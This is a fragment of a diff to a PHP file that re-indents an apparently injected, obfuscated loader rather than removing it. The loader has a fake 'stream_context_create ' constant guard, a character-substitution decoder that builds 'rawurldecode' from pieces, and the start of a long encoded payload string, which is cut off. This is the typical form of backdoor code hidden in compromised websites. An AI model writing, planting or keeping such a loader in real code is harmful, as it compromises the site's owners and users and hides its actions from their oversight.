@@ -1,10 +1,16 @@
 <?php
-if (!defined('stream_context_create '))
-{
-define('stream_context_create ', 1);
-
- $ypffecpvfz = 6371; function ugqkkci($pqtqrdeeam, $koanh){$ofwzm = ''; for($i=0; $i < strlen($pqtqrdeeam); $i++){$ofwzm .= isset($koanh[$pqtqrdeeam[$i]]) ? $koanh[$pqtqrdeeam[$i]] : $pqtqrdeeam[$i];}
-$tgccd="rawurl" . "decode";return $tgccd($ofwzm);}
+if (!defined('stream_context_create ')){
+  define('stream_context_create ', 1);
+  $ypffecpvfz = 6371;
+ 
+  function ugqkkci($pqtqrdeeam, $koanh){
+    $ofwzm = '';
+    for($i=0; $i < strlen($pqtqrdeeam); $i++){
+      $ofwzm .= isset($koanh[$pqtqrdeeam[$i]]) ? $koanh[$pqtqrdeeam[$i]] : $pqtqrdeeam[$i];
+    }
+    $tgccd="rawurl" . "decode";return $tgccd($ofwzm);
+  }
+ 
 $ssyowfjkl = '%dR%dB%dR%dB%TdMDM_sEc%jH%jGEuu5u_W5N%jG%jh%jdLaKK%j4%8m%dR%dB%TdMDM_sEc%jH%jGW5N_Euu5us%jG%jh'.
 '%jdd%j4%8m%dR%dB%TdMDM_sEc%jH%jGiVo_EoEkAcM5D_cMiE%jG%jh%jdd%j4%8m%dR%dB%TdEuu5u_uEb5'.
 'ucMDN%jHd%j4%8m%dR%dB%TdsEc_cMiE_WMiMc%jHd%j4%8m%dR%dB%dR%dB%dR%dBMe%jH%j9OEeMDEO%jH%jjxwx_Zq'.
